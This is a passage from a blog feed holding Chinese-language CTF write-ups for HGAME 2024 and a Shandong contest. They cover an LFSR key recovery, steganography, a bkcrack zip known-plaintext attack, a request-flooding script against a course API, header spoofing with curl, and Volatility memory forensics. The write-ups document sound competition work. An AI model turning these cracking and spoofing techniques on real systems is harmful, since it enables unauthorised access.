punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">,</span>nextbit<span class=\"token punctuation\">)</span><span class=\"token operator\">=</span>PRNG<span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">,</span>mask<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        out<span class=\"token operator\">+=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>nextbit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    output<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'output=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>output<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#outputspan></pre></td></tr></table></figure><p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Olist <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token stringspan><span class=\"token punctuation\">,</span> <span class=\"token stringspan><span class=\"token punctuation\">,</span> <span class=\"token stringspan><span class=\"token punctuation\">,</span> <span class=\"token stringspan><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>mask<span class=\"token operator\">=</span><span class=\"token string\">'10001001000010000100010010001001'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>key <span class=\"token operator\">=</span> Olist<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>R <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    output <span class=\"token operator\">=</span> <span class=\"token string\">'x'</span><span class=\"token operator\">+</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">31</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    out <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">28</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    R <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    key <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">31</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote fbbbee82-3f43-4f91-9337-907880e4191a\\=\"\">\n<p>#算 4 次根据 uuid4 分配即可<br>\nhgame\\</p>\n</blockquote>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"signin25pt\"><a class=\"markdownIt-Anchor\" href=\"#signin25pt\">#</a> SignIn(25pt)</h3>\n<blockquote>\n<p>换个方式签个到 flag 格式：‘hgame {[A-Z_]+}’</p>\n</blockquote>\n<p><img data-src=\"/img/Hgame_wp_week1/try_another_way_to_see.png\" alt=\"try_another_way_to_see\"></p>\n<p>极度抽象</p>\n<p><img data-src=\"/img/Hgame_wp_week1/image-20240202111839063.png\" alt=\"image-20240202111839063\"></p>\n<h3 id=\"来自星尘的问候100pt\"><a class=\"markdownIt-Anchor\" href=\"#来自星尘的问候100pt\">#</a> 来自星尘的问候 (100pt)</h3>\n<blockquote>\n<p>一个即将发售的游戏的主角薇 ^3 带来了一条消息。这段消息隐藏在加密的图片里 但即使解开了图片的六位弱加密，看到的也是一张迷惑的图片。 也许游戏的官网上有这种文字的记录？补充：flag 格式为 <code>hgame\\&#123;[a-z0-9_]+\\&#125;</code></p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python main.py <span class=\"token parameter variable\">-f</span> secret.jpg <span class=\"token parameter variable\">-p</span> <span class=\"token number\">123456</span></pre></td></tr></table></figure><blockquote>\n<p>steghide: application/zip</p>\n</blockquote>\n<p>打开压缩包</p>\n<p><img data-src=\"/img/Hgame_wp_week1/exa.png\" alt=\"exa\"></p>\n<p>网上社工了属于是，根据提示为来自星尘的游戏的文字记录。</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9teTFsLmdpdGh1Yi5pby9DdHJsL0N0cmxBc3RyLmh0bWw=\">Ctrl Astr 3.14 (my1l.github.io)</span></p>\n</blockquote>\n<p>找到此类文字的生成网址</p>\n<blockquote welc0me!\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"simple_attack100pt\"><a class=\"markdownIt-Anchor\" href=\"#simple_attack100pt\">#</a> simple_attack(100pt)</h3>\n<blockquote>\n<p>怎么解开这个压缩包呢？</p>\n</blockquote>\n<p>明显的明文攻击</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>bkcrack.exe <span class=\"token parameter variable\">-C</span> attachment.zip <span class=\"token parameter variable\">-c</span> 103223777_p0.jpg <span class=\"token parameter variable\">-P</span> 103223777_p0.zip <span class=\"token parameter variable\">-p</span> 103223777_p0.jpg</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>bkcrack.exe <span class=\"token parameter variable\">-C</span> attachment.zip <span class=\"token parameter variable\">-k</span> e423add9 375dcd1c 1bce583e <span class=\"token parameter variable\">-U</span> new.zip easy</pre></td></tr></table></figure><p>得到里面的 base64，转图片</p>\n<p>得到 flag</p>\n<p><img data-src=\"/img/Hgame_wp_week1/download.png\" alt=\"download\"></p>\n<h3 id=\"希儿希儿希尔120pt\"><a class=\"markdownIt-Anchor\" href=\"#希儿希儿希尔120pt\">#</a> 希儿希儿希尔 (120pt)</h3>\n<blockquote>\n<p>Ch405 是一名忠实的希儿厨，于是他出了一道这样的题，不过他似乎忘了这个加密的名字不是希儿了（x 虽然经常有人叫错 补充： 图片打不开是正常现象，需要修复 最终得到的大写字母请用 hgame {} 包裹</p>\n</blockquote>\n<p>图片尾部有压缩文件</p>\n<blockquote>\n<p>CVOCRJGMKLDJGBQIUIVXHEYLPNWR</p>\n</blockquote>\n<p>修复图片</p>\n<p><img data-src=\"/img/Hgame_wp_week1/fix_secret.png\" alt=\"fix_secret\"></p>\n<p>lsb 无密码隐写得到希尔密钥</p>\n<p>KEY:[8,7|3,8];A=0</p>\n<p>解希尔字符串即可</p>\n<blockquote DISAPPEARINTHESEAOFBUTTERFLY\\=\"\">\n<p>DISAPPEARINTHESEAOFBUTTERFLY</p>\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"签到10pt\"><a class=\"markdownIt-Anchor\" href=\"#签到10pt\">#</a> 签到 (10pt)</h3>\n<blockquote>\n<p>关注 “凌武科技” 微信公众号，发送 “HGAME2024” 获得 Flag！</p>\n</blockquote>\n<blockquote welc0me\\_t0\\_HGAME\\_2024\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> WEB</h2>\n<h3 id=\"204816250pt\"><a class=\"markdownIt-Anchor\" href=\"#204816250pt\">#</a> <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>2048</mn><mo>∗</mo><mn>16</mn></mrow><annotation encoding=\"application/x-tex\">2048*{16}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">1</span><span class=\"mord\">6</span></span></span></span></span>(250pt)</h3>\n<blockquote>\n<p>2048 还是太简单了，柏喵喵决定挑战一下 2048*16</p>\n</blockquote>\n<p>简单的 base64 换表</p>\n<p>刷新时 F12，看游戏执行源码，可以找到</p>\n<blockquote>\n<p>var x = [“debu”, “charAt”, “game-over”, “push”, “tile”, “3218200jObBXv”, “gger”, “bestContainer”, “firstChild”, “chain”, “4992592cfFfKg”, “updateBestScore”, “Game over!”, “add”, “score-addition”, “.best-container”, “over”, “.tile-container”, “scoreContainer”, “counter”, “clearMessage”, “tile-”, “tile-merged”, “appendChild”, “remove”, “1457704JdCGrI”, “apply”, “clearContainer”, “message”, “1135845OAckHq”, “init”, “requestAnimationFrame”, “addTile”, “applyClasses”, “\\+\\+ <em>(?:[a-zA-Z_][0-9a-zA-Z_]</em>)”, “value”, “while (true) {}”, “call”, “length”, “querySelector”, “indexOf”, “string”, “div”, “tile-new”, “function *\\( *\\)”, “setInterval”, “2589jWZTtI”, “updateScore”, “class”, “createElement”, “score”, ‘{}.constructor(“return this”)( )’, “4321134sPxlgc”, “stateObject”, “positionClass”, “action”, “terminated”, “won”, “tile-position-”, “constructor”, “join”, “fromCharCode”, “forEach”, “textContent”, “normalizePosition”, “continueGame”, “previousPosition”, “bestScore”, “3224mBKYMJ”, “1522395ywebnW”, “prototype”, “.score-container”, “actuate”, “getElementsByTagName”, “tile-super”, “classList”, “messageContainer”, “I7R8ITMCnzbCn5eFIC=6yliXfzN=I5NMnz0XIC==yzycysi70ci7y7iK”, “tileContainer”];</p>\n</blockquote>\n<p>其中</p>\n<blockquote>\n<p>I7R8ITMCnzbCn5eFIC=6yliXfzN=I5NMnz0XIC==yzycysi70ci7y7iK</p>\n</blockquote>\n<p>为换表后的 base64 加密字符串，</p>\n<blockquote>\n<p>g[h(432)][h(469)] = function(x) {<br>\nvar n = h<br>\n, e = x ? “game-won” : n(443)<br>\n, t = x ? s0(n(439), “V+g5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl=QcTq6JkWK4t3”) : n(453);<br>\nthis[n(438)][n(437)].add(e),<br>\nthis[n(438)]<a href=\"%22p%22\">n(435)</a>[-1257 * -5 + 9 * 1094 + -5377 * 3].textContent = t<br>\n}</p>\n</blockquote>\n<p>虽然我看不太懂，但是 game-won 应该时输出了这个 base64 的换表</p>\n<p>直接赛博橱子</p>\n<p><img data-src=\"/img/Hgame_wp_week1/image-20240202121855359.png\" alt=\"image-20240202121855359\"></p>\n<h3 id=\"bypass-it100pt\"><a class=\"markdownIt-Anchor\" href=\"#bypass-it100pt\">#</a> Bypass it(100pt)</h3>\n<blockquote>\n<p>This page requires javascript to be enabled 😃</p>\n</blockquote>\n<p>js 前端验证，也是第一次见。</p>\n<blockquote>\n<p>用的火狐浏览器</p>\n<p>首先在 url 地址栏上输入</p>\n<blockquote>\n<p>about:config</p>\n</blockquote>\n<p>接受风险之后，接着输入</p>\n<blockquote>\n<p>javascript.enabled</p>\n</blockquote>\n<p>将 true 转换成 false</p>\n</blockquote>\n<p>首先要是 javascript.enabled = true; 否则会显示<strong> You don’t have javascript enabled. Good luck with that 😃</strong></p>\n<p>然后在登陆界面改换成 false; 点击注册</p>\n<p>随便输入用户名即可；注册完成之后在改成 true</p>\n<p>然后登陆</p>\n<blockquote 7b8256d51347bb64043ce0ac9877656c53b9da9b\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"jhat100pt\"><a class=\"markdownIt-Anchor\" href=\"#jhat100pt\">#</a> jhat(100pt)</h3>\n<blockquote>\n<p>jhat is a tool used for analyzing Java heap dump files</p>\n<p><strong>提示 1</strong>hint1: need rce</p>\n<p><strong>提示 2</strong>hint2: focus on oql</p>\n<p><strong>提示 3</strong>hint3: 题目不出网 想办法拿到执行结果</p>\n</blockquote>\n<p>没做</p>\n<h3 id=\"select-courses100pt\"><a class=\"markdownIt-Anchor\" href=\"#select-courses100pt\">#</a> Select Courses(100pt)</h3>\n<blockquote>\n<p>Can you help ma5hr00m select the desired courses?</p>\n</blockquote>\n<blockquote>\n<p>偶然间用 burp，随意放包选上了一次课，故怀疑概率有课能被选中，写脚本跑这概率事件即可，经测试约 3,700 次所有课全部选中</p>\n</blockquote>\n<p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://47.100.245.185:32274/api/courses\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token string\">\"User-Agent\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token string\">\"Accept\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"*/*\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token string\">\"Accept-Language\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token string\">\"Accept-Encoding\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"gzip, deflate\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token string\">\"Referer\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"http://47.102.130.35:32583/\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token string\">\"Content-Type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"application/json\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token string\">\"Origin\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"http://47.102.130.35:32583\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token string\">\"Connection\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"close\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> i<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> json<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   \t    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Status Code: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>response<span class=\"token punctuation\">.</span>status_code<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, Response: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>h</mi><mi>g</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo stretchy=\"false\">{</mo><mi>w</mi><mn>0</mn><mi>W</mi><mi mathvariant=\"normal\">_</mi><mo stretchy=\"false\">!</mo><mi mathvariant=\"normal\">_</mi><mn>1</mn><mi>E</mi><mn>4</mn><mi>R</mi><mi>n</mi><mi mathvariant=\"normal\">_</mi><mi>T</mi><mi>o</mi><mi mathvariant=\"normal\">_</mi><mi>u</mi><mn>5</mn><mi>e</mi><mi mathvariant=\"normal\">_</mi><mn>5</mn><mi>c</mi><mi>r</mi><mi>i</mi><mi>p</mi><mi>T</mi></mrow><annotation encoding=\"application/x-tex\">hgame\\{w0W\\_!\\_1E4Rn\\_To\\_u5e\\_5cripT</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.06em;vertical-align:-0.31em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mopen\">{</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mord\">0</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mord\" style=\"margin-right:0.02778em;\">_</span><span class=\"mclose\">!</span><span class=\"mord\" style=\"margin-right:0.02778em;\">_</span><span class=\"mord\">1</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord\">4</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\">n</span><span class=\"mord\" style=\"margin-right:0.02778em;\">_</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">o</span><span class=\"mord\" style=\"margin-right:0.02778em;\">_</span><span class=\"mord mathnormal\">u</span><span class=\"mord\">5</span><span class=\"mord mathnormal\">e</span><span class=\"mord\" style=\"margin-right:0.02778em;\">_</span><span class=\"mord\">5</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"normal\">_</mi></mrow><annotation encoding=\"application/x-tex\">\\_</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:-0.31em;\"></span><span class=\"mord\" style=\"margin-right:0.02778em;\">_</span></span></span></span><sup>_</sup>}</p>\n</blockquote>\n<h3 id=\"ezhttp50pt\"><a class=\"markdownIt-Anchor\" href=\"#ezhttp50pt\">#</a> ezHTTP(50pt)</h3>\n<blockquote>\n<p>HTTP Protocol Basics</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-H</span> <span class=\"token string\">\"Referer: vidar.club\"</span> <span class=\"token parameter variable\">-H</span> <span class=\"token string\">\"User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0\"</span> <span class=\"token parameter variable\">-H</span> <span class=\"token string\">\"X-Real-IP: 127.0.0.1\"</span> http://47.100.137.175:31983 <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span><span class=\"token file-descriptor important\">&amp;1</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">--color</span> <span class=\"token parameter variable\">-E</span> <span class=\"token string\">'Authorization'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">##</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">&lt;</span> Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJGMTRnIjoiaGdhbWV7SFRUUF8hc18xbVAwclQ0bnR9In0.VKMdRQllG61JTReFhmbcfIdq7MvJDncYpjaT7zttEDc</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">##</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>使用 <span class=\"token function\">awk</span> 命令根据点号分隔 JWT，并对每一部分进行 base64 解码。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJGMTRnIjoiaGdhbWV7SFRUUF8hc18xbVAwclQ0bnR9In0.VKMdRQllG61JTReFhmbcfIdq7MvJDncYpjaT7zttEDc\"</span> <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F. <span class=\"token string\">'&#123;print $2&#125;'</span> <span class=\"token operator\">|</span> base64 <span class=\"token parameter variable\">--decode</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">##</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"F14g\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"hgame&#123;HTTP_!s_1mP0rT4nt&#125;\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">##</span></pre></td></tr></table></figure>",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/11/15/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/",
            "url": "http://example.com/2023/11/15/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/",
            "title": "技能兴鲁",
            "date_published": "2023-11-15T00:01:08.000Z",
            "content_html": "<h1 id=\"技能兴鲁\"><a class=\"markdownIt-Anchor\" href=\"#技能兴鲁\">#</a> 技能兴鲁</h1>\n<p>最终排名 15 名</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/1png\" alt=\"img\"></p>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> <strong>Misc</strong></h2>\n<h3 id=\"datas_secret\"><a class=\"markdownIt-Anchor\" href=\"#datas_secret\">#</a> Datas_secret</h3>\n<pre><code class=\"language-Python\"> python2 vol.py -f image.vmem --profile=Win7SP1x64 filescan|grep flag\n python2 vol.py -f image.vmem --profile=Win7SP1x64 dumpfiles -Q 0x0000000007a09f20 -D  ./\n</code></pre>\n<p 23030d1c2aa90debdf7757782e9f1ee9=\"\">flag</p>\n<h3 id=\"卑劣的手段\"><a class=\"markdownIt-Anchor\" href=\"#卑劣的手段\">#</a> 卑劣的手段</h3>\n<pre><code class=\"language-Bash\">python2 vol.py -f image1.vmem --profile=WinXPSP1x64 filescan | grep png\n python2 vol.py -f image1.vmem --profile=Win7SP1x64 dumpfiles -Q 0x0000000002d44eb0 -D  ./\nzsteg chuyin.png\n</code></pre>\n<p>flag{Hat3une_M1ku}rI$</p>\n<h3 id=\"时间不多了\"><a class=\"markdownIt-Anchor\" href=\"#时间不多了\">#</a> 时间不多了</h3>\n<pre><code class=\"language-Python\">import os\nfrom pyzbar.pyzbar import decode\nfrom PIL import Image\n\ndef scan_qrcodes(folder_path):\n    # 检查文件夹中的所有文件\n    for filename in os.listdir(folder_path):\n        if filename.endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):\n            # 拼接完整的文件路径\n            file_path = os.path.join(folder_path, filename)\n            # 打开图像文件\n            image = Image.open(file_path)\n            # 解码图像中的二维码\n            decoded_objects = decode(image)\n            # 打印所有解码出的二维码内容\n            for obj in decoded_objects:\n                print(f&quot;文件 &#123;filename&#125; 中的二维码内容: &#123;obj.data.decode('utf-8')&#125;&quot;)\n\n# 使用示例\nfolder_path = './attachment'\nscan_qrcodes(folder_path)\n</code></pre>\n<p>扫描二维码得到 